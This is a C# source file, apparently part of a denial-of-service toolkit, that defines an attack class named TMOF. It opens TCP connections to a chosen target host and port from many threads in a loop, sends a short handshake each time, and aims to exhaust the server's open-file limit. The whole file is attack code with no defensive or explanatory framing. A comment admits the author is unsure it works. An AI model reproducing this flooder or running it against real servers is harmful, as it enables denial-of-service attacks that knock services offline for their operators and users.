using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using GAS.Core.Tools;

namespace GAS.Core.Attacks {
    /// <summary>
    /// this attack exploits pam open file limit 
    /// and causes "Too Many Open Files" error
    /// _i'_m  not sure it wotks well
    /// </summary>
    class TMOF : IAttacker {
        readonly byte[] _handshake = { 1, 2, 3 };
        IPAddress _ip = IPAddress.Loopback;
        bool _init;
        private readonly Thread[] _workingThreads;
        volatile int _msockets = int.MaxValue;
        public TMOF( string target, int port, int threadcount, int maxSocketsOnAttacker ) {
            this.Target = target;
            this.Port = port;
            this.ThreadCount = threadcount;
            this._msockets = maxSocketsOnAttacker;
            this._workingThreads = new Thread[ this.ThreadCount ];
        }
        public override void Start() {
            if ( this.IsFlooding )
                this.Stop();
            this.IsFlooding = true;
            for ( var i = 0; i < this.ThreadCount; i++ )
                ( this._workingThreads[ i ] = new Thread( this.bw_DoWork ) ).Start( i );
            this._init = true;
        }
        private void bw_DoWork( object indexinthreads ) {
            #region Wait 4 init
            while ( !this._init ) Thread.Sleep( 100 );
            var myIndexForWork = (int) indexinthreads;
            #endregion
            #region DDoS
            try {
                var csockets = 0;
                while ( this.IsFlooding ) {
                    while ( csockets > this._msockets )
                        Thread.Sleep( 100 );
                    try {
                        csockets++;
                        var s = new RSocket( AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp ) {
                            NoDelay = true
                        };
                        s.Connect( this.Target, this.Port );
                        s.Shutdown( SocketShutdown.Receive );
                        s.Send( this._handshake );
                        s.Dispose();
                        csockets--;
                    }
                    catch ( Exception ) { }
                }
            }
            catch ( Exception ) { }
            #endregion
        }
        public override void Stop() {
            this.IsFlooding = false;
        }
    }
}
